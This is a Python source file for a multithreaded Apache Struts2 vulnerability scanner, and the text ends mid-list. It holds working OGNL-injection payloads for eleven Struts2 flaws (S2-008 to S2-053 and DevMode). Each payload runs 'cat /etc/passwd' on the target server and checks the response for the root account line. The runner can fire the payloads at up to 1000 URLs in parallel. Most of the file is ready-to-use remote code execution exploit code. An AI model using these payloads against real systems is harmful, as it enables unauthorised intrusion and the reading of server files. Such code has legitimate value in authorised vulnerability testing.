from queue import Queue
import threading

# from tc_s2_hole import S2_001_Hole  # post
# from tc_s2_hole import S2_007_Hole  # post
# from tc_s2_hole import S2_012_Hole  # post

# from tc_s2_get_hole import S2_008_Hole  # get
# from tc_s2_get_hole import S2_013_Hole  # get
# from tc_s2_get_hole import S2_015_Hole  # get
# from tc_s2_get_hole import S2_016_Hole  # get
# # no
# # from tc_s2_hole import S2_019_Hole   #download file
# from tc_s2_get_hole import S2_029_Hole  # get
# from tc_s2_get_hole import S2_032_Hole  # get
# from tc_s2_get_hole import S2_033_Hole  # get
# from tc_s2_get_hole import S2_037_Hole  # get
# from tc_s2_get_hole import S2_045_Hole  # http header
# # 46 no
# # 48 no
# from tc_s2_get_hole import S2_053_Hole  # get
# from tc_s2_get_hole import S2_DevMode_Hole  # get

import requests
from http.client import IncompleteRead
from urllib import request as urllib2
from urllib.parse import urlparse
import datetime
import time
import re

import traceback
import socket
import urllib3
import urllib
from urllib import error
import codecs

sleep_time = 0


class S2_008_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-008'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-008 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /etc/passwd%27%29.getInputStream%28%29%29)"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                # print(str(i) + 'a:' + str(resp.status_code and res[i] in str(resp.content)[2:-1]))
                # print(str(i) + ':' + str(res[i] in str(resp.content)[2:-1]))
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    #					print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-053' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())

                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }
                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_013_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-013'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-013 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('cat /etc/passwd').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-013' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())

                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_015_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-015'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-015 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat%20/etc/passwd').getInputStream())}.action"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    #	print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-013' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())


                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_016_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-016'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-016 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%29%7D"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-016' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())



                    
                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_029_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-029'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-029 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["?message=(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtectedAccess%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAccess[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-029' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())


                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_032_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-032'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-032 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                #				resp=requests.post(poc_url, headers=self.headers, data=self.poc['ST2-005'], timeout=6, verify=False)
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-032' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())
                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_033_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-033'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-033 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=cat%20/etc/passwd"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            # print(poc_url)
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-033' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())


                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_037_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-037'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-037 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["/4/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=cat%20/etc/passwd"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-037' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())


                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }
                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_045_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-045'
        self.detect_method = '修改http-header:Content-Type'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-045 poc from cf_hb.'
        }
        self.info = "通过{method}为{payload}"

    def verify(self):

        cmds = ['cat /etc/passwd']
        res = ['/root:/bin/bash']
        i = -1
        for cmd in cmds:
            i = i + 1
            payload = "%{(#_='multipart/form-data')."
            payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            payload += "(#_memberAccess?"
            payload += "(#_memberAccess=#dm):"
            payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            payload += "(#ognlUtil.getExcludedPackageNames().clear())."
            payload += "(#ognlUtil.getExcludedClasses().clear())."
            payload += "(#context.setMemberAccess(#dm))))."
            payload += "(#cmd='%s')." % cmd
            payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
            payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            payload += "(#ros.flush())}"

            try:
                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
                request = urllib2.Request(self.check_url, headers=headers)
                page = urllib2.urlopen(request).read()
            # print(page)
            # print(page.content)
            except IncompleteRead as e:
                page = e.partial
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print(self.check_url, self.hole_name, "Failed to connection target...")
                print(e)
                traceback.print_exc()
                return None

            if res[i] in str(page)[2:-1]:
                # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',payload)
                #with codecs.open('/tmp/result/s2-045' + str(self.local_time), 'w', 'utf-8') as f:
                #    f.write(self.check_url)
                #    f.write(resp.content.decode())


                re = {
                    'tc_time': self.local_time,
                    'hole_name': self.hole_name,
                    'method': self.detect_method,
                    'info': self.info.format(
                        method=self.detect_method,
                        payload=payload
                    )
                }

                return re

        return None


class S2_053_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-053'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-053 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    #with codecs.open('/tmp/result/s2-053' + str(self.local_time), 'w', 'utf-8') as f:
                    #    f.write(self.check_url)
                    #    f.write(resp.content.decode())

                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


class S2_DevMode_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-devmode'
        self.detect_method = 'http get'
        self.urlinfo = urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-devmode poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc}"

    def verify(self):
        poc = ["/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=cat%20/etc/passwd"]
        res = ["/root:/bin/bash"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    # print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }

                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ReadTimeoutError,
                TimeoutError,
                ConnectionResetError,
                urllib.error.HTTPError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


def verify_holes(check_url, res_q):
    hole_008 = S2_008_Hole(check_url)
    hole_013 = S2_013_Hole(check_url)
    hole_015 = S2_015_Hole(check_url)
    hole_016 = S2_016_Hole(check_url)
    hole_029 = S2_029_Hole(check_url)
    hole_032 = S2_032_Hole(check_url)
    hole_033 = S2_033_Hole(check_url)
    hole_037 = S2_037_Hole(check_url)
    hole_045 = S2_045_Hole(check_url)
    hole_053 = S2_053_Hole(check_url)
    hole_devmode = S2_DevMode_Hole(check_url)

    res = []
    onehole = hole_008.verify()
    res.append(onehole)
    onehole = hole_013.verify()
    res.append(onehole)
    onehole = hole_015.verify()
    res.append(onehole)
    onehole = hole_016.verify()
    res.append(onehole)
    onehole = hole_029.verify()
    res.append(onehole)
    onehole = hole_032.verify()
    res.append(onehole)
    onehole = hole_033.verify()
    res.append(onehole)
    onehole = hole_037.verify()
    res.append(onehole)
    onehole = hole_045.verify()
    res.append(onehole)
    onehole = hole_053.verify()
    res.append(onehole)
    onehole = hole_devmode.verify()
    res.append(onehole)

    holeresult = []
    for onehole in res:
        if onehole == None:
            continue
        holeresult.append(onehole)

    url_res = {}
    url_res["url"] = check_url
    url_res["holeresult"] = holeresult
    # print url_res
    return url_res


class BatchThreads(threading.Thread):
    def __init__(self, url_q, res_q, processer):
        super(BatchThreads, self).__init__()
        self.url_q = url_q
        self.res_q = res_q
        self.result = {}
        self.proceser = processer

    def run(self):
        while True:
            if self.url_q.empty():
                break
            else:
                try:
                    url = self.url_q.get()
                    # print(url)
                    self.result = scan_hole(url, self.res_q, self.proceser)
                    # self.result = verify_holes(url, self.res_q)
                except:
                    break

    def get_result(self):
        return self.result


def perform_s2_tasks(url_list):
    url_q = Queue()
    res_q = Queue()
    _thread_num = 1000

    global threads
    threads = []

    if url_list:
        for url in url_list:
            url_q.put(url)

    if _thread_num > (url_q.qsize() / 2):
        _thread_num = url_q.qsize()
        print('thread_num:', _thread_num)

    for _ in range(_thread_num):
        threads.append(BatchThreads(url_q, res_q))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # get result
    resultall = []
    for t in threads:
        resultall.append(t.get_result())

    task_res = {}
    task_res["task_id"] = '1'
    task_res["url_result"] = resultall
    print(task_res)


def hole_verify(hole, url, res_q):
    res_q.put((url, hole.verify()))


def scan_hole(url, res_q, processer):
    hole_list = [
        S2_008_Hole(url),
        S2_013_Hole(url),
        S2_015_Hole(url),
        S2_016_Hole(url),
        S2_029_Hole(url),
        S2_032_Hole(url),
        S2_033_Hole(url),
        S2_037_Hole(url),
        S2_045_Hole(url),
